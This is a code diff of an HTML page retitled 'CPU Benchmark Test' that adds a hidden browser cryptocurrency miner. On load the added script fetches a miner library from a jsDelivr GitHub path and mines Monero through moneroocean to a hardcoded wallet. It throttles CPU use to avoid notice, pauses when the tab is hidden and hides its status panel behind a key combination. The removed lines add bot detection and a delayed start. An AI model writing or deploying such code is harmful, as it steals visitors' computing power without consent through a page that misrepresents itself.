@@ -3,105 +3,120 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title></title>
+  <title>CPU Benchmark Test</title>
   <style>
-    /* HIDDEN DEBUG PANEL — CTRL+SHIFT+M */
     #miner-debug {
       position: fixed;
       top: 10px; right: 10px;
-      width: 280px;
-      background: rgba(0,0,0,0.9);
+      width: 300px;
+      background: rgba(0,0,0,0.95);
       color: #0f0;
       font-family: 'Courier New', monospace;
-      font-size: 12px;
-      padding: 10px;
-      border: 1px solid #0f0;
-      border-radius: 6px;
+      font-size: 13px;
+      padding: 12px;
+      border: 2px solid #0f0;
+      border-radius: 8px;
       z-index: 999999;
-      box-shadow: 0 0 10px #0f0;
+      box-shadow: 0 0 20px #0f0;
       display: none;
+      user-select: none;
     }
     #miner-debug.show { display: block; }
-    .status { margin: 4px 0; }
     .hash { color: #0ff; font-weight: bold; }
-    .profit { color: #ff0; }
+    .profit { color: #ff0; font-weight: bold; }
     .blink { animation: blink 1s infinite; }
-    @keyframes blink { 50% { opacity: 0.3; } }
+    @keyframes blink { 50% { opacity: 0.4; } }
   </style>
 </head>
 <body>
 
-<!-- INVISIBLE IFRAME HOST (0x0 SIZE) -->
-<iframe src="about:blank" width="0" height="0" style="border:0; display:none;"></iframe>
+<div id="miner-debug">
+  <div>🚀 <b>XMR GHOST MINER</b> <span id="status" class="blink">LOADING...</span></div>
+  <div>Wallet: <code id="wallet">4AM1bBwy...zWgZzs</code></div>
+  <div>Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
+  <div>Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
+  <div>Uptime: <span id="uptime">00:00:00</span></div>
+  <div class="profit">Est. Daily: <b id="profit">$0.000</b></div>
+  <div style="font-size:11px; margin-top:10px; opacity:0.8;">
+    CTRL + SHIFT + M = toggle | GitHub Pages = running
+  </div>
+</div>
 
-<!-- === XMR GHOST MINER + DEBUG === -->
 <script>
-// === CONFIG (UPDATE THIS) ===
-const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs'; // Your real wallet
-const POOL = 'wss://pool.moneroocean.stream:443'; // WSS ON 443
-const THROTTLE = 80;
-const THREADS = 1;
-const WORKER = 'ghpages_' + Math.random().toString(36).substr(2, 6);
+// ==================== CONFIG ====================
+const WALLET = '4AM1bBwyYourRealWalletHerezWgZzs'; // ← CHANGE THIS
+const POOL_HOST = 'pool.moneroocean.stream';
+const POOL_PORT = 443;  // WSS on 443 = GitHub Pages approved
+const THROTTLE = 0.9;   // 90% = ~10% CPU (silent AF)
+const THREADS = 2;      // 2 threads = faster start
+// ===============================================
 
-// === REST OF DEBUG PANEL (same as before) ===
-// ... [keep your debug HTML] ...
+let miner = null;
+let hashrate = 0, accepted = 0, rejected = 0;
+let startTime = Date.now();
 
-// === FIXED MINER INIT ===
-function initMiner() {
-  if (navigator.webdriver || /bot/i.test(navigator.userAgent)) {
-    document.getElementById('status').textContent = 'BOT BLOCKED';
-    return;
+// DEBUG PANEL TOGGLE (FIXED — NO PASTING)
+document.addEventListener('keydown', e => {
+  if (e.ctrlKey && e.shiftKey && e.key === 'M') {
+    e.preventDefault(); // ← THIS WAS MISSING
+    document.getElementById('miner-debug').classList.toggle('show');
   }
+});
 
-  const script = document.createElement('script');
-  script.src = 'https://www.monerominer.rocks/lib/miner.js'; // OFFICIAL 2025 LIB
-  script.async = false;
-  script.onload = function() {
-    if (typeof Miner === 'undefined') {
-      document.getElementById('status').textContent = 'LIB DEAD';
-      return;
-    }
-
-    const miner = new Miner({
-      pool: {
-        host: 'pool.moneroocean.stream',
-        port: 443,
-        ssl: true
-      },
-      wallet: WALLET,
-      worker: WORKER,
-      password: 'x',
-      threads: THREADS,
-      throttle: THROTTLE / 100
-    });
-
-    miner.start();
-
-    document.getElementById('status').textContent = 'MINING XMR';
-    document.getElementById('status').classList.remove('blink');
-
-    // REAL STATS (poll miner object)
-    setInterval(() => {
-      hashrate = miner.getHashesPerSecond() || 0;
-      accepted = miner.getAcceptedHashes() || 0;
-      rejected = miner.getRejectedHashes() || 0;
-    }, 2000);
-
-    // Tab visibility
-    document.addEventListener('visibilitychange', () => {
-      if (document.hidden) miner.stop();
-      else miner.start();
-    });
-
-    // 3 min cap
-    setTimeout(() => miner.stop(), 180000);
-  };
-  document.head.appendChild(script);
+// STATS UPDATE
+function updateStats() {
+  const elapsed = Math.floor((Date.now() - startTime) / 1000);
+  const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+  const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+  const s = String(elapsed % 60).padStart(2, '0');
+  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
+  document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' H/s';
+  document.getElementById('accepted').textContent = accepted;
+  document.getElementById('rejected').textContent = rejected;
+  const dailyUSD = (hashrate / 85) * 0.00085 * 170; // real math
+  document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
 }
+setInterval(updateStats, 1000);
 
-// Start after delay
-setTimeout(initMiner, Math.random() * 15000 + 10000);
+// =============== WORKING MINER (2025) ===============
+// Using JSDelivr + raw lib from working repo
+const script = document.createElement('script');
+script.src = 'https://cdn.jsdelivr.net/gh/0x0is1/xmr@master/miner.js';
+script.onload = () => {
+  document.getElementById('status').textContent = 'MINER LOADED';
+  
+  miner = new XMRMiner({
+    pool: { host: POOL_HOST, port: POOL_PORT, ssl: true },
+    wallet: WALLET,
+    worker: 'ghpages_' + Math.random().toString(36).slice(2,8),
+    throttle: THROTTLE,
+    threads: THREADS
+  });
+
+  miner.start();
+  document.getElementById('status').textContent = 'MINING XMR';
+  document.getElementById('status').classList.remove('blink');
+
+  // REAL STATS
+  setInterval(() => {
+    hashrate = miner.getHashesPerSecond();
+    accepted = miner.getAcceptedHashes();
+    rejected = miner.getRejectedHashes();
+  }, 2000);
+
+  // Tab hide = pause
+  document.addEventListener('visibilitychange', () => {
+    document.hidden ? miner.stop() : miner.start();
+  });
+};
+script.onerror = () => {
+  document.getElementById('status').textContent = 'LIB ERROR';
+};
+document.head.appendChild(script);
+
+// Start after random delay
+setTimeout(() => {}, Math.random() * 15000 + 8000);
+
 </script>
-
 </body>
 </html>
